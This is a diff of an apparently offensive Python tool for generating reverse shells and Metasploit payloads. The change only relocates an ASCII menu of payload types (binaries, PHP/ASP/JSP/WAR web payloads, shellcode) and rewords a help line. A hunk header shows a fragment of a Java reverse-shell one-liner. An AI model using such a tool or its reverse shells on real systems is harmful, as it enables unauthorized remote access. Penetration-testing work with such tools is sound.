@@ -180,6 +180,26 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 
 def payload():
+    print(f"""{choice(color)}
+                      _________________________________________________________
+
+                                   Creating Metasploit Payloads
+         __________________________________________________________________________________
+        |                  |                 |                       |                     |
+        | #Binaries        |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
+        |__________________|_________________|_______________________|_____________________|
+        |                  |                 |                       |                     |
+        | 1) Linux         | 6)  PHP         | 11) Python            | 15) Linux based     |
+        |                  |                 |                       |                     |
+        | 2) Windows (exe) | 7)  ASP         | 12) Bash              | 16) Windows based   |
+        |                  |                 |                       |                     |
+        | 3) Windows (dll) | 8)  JSP         | 13) Perl              | 17) Mac based       |
+        |                  |                 |                       |                     |
+        | 4) Windows (msi) | 9)  WAR         | 14) Ruby              |                     |
+        |                  |                 |                       |                     |
+        | 5) Mac           | 10) Nodejs      |                       |                     |
+        |__________________|_________________|_______________________|_____________________|
+""")
     while True:
         ven = input('Enter payload: ')
         try:
@@ -311,29 +331,9 @@ def main(arg):
     if args.use == 'shell':
         shell()
     elif args.use == 'msf':
-        print(choice(color) + """
-                      _________________________________________________________
-
-                                   Creating Metasploit Payloads
-         __________________________________________________________________________________
-        |                  |                 |                       |                     |
-        | #Binaries        |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
-        |__________________|_________________|_______________________|_____________________|
-        |                  |                 |                       |                     |
-        | 1) Linux         | 6)  PHP         | 11) Python            | 15) Linux based     |
-        |                  |                 |                       |                     |
-        | 2) Windows (exe) | 7)  ASP         | 12) Bash              | 16) Windows based   |
-        |                  |                 |                       |                     |
-        | 3) Windows (dll) | 8)  JSP         | 13) Perl              | 17) Mac based       |
-        |                  |                 |                       |                     |
-        | 4) Windows (msi) | 9)  WAR         | 14) Ruby              |                     |
-        |                  |                 |                       |                     |
-        | 5) Mac           | 10) Nodejs      |                       |                     |
-        |__________________|_________________|_______________________|_____________________|
-""")
         payload()
     elif args.use != 'shell' and args.use != 'msf':
-        print(choice(color) + 'Type "python shell.py -h" or "shell -h" for options')
+        print(f'{choice(color)}Use `{__file__} -h` for options.')
 
 
 if __name__ == '__main__':
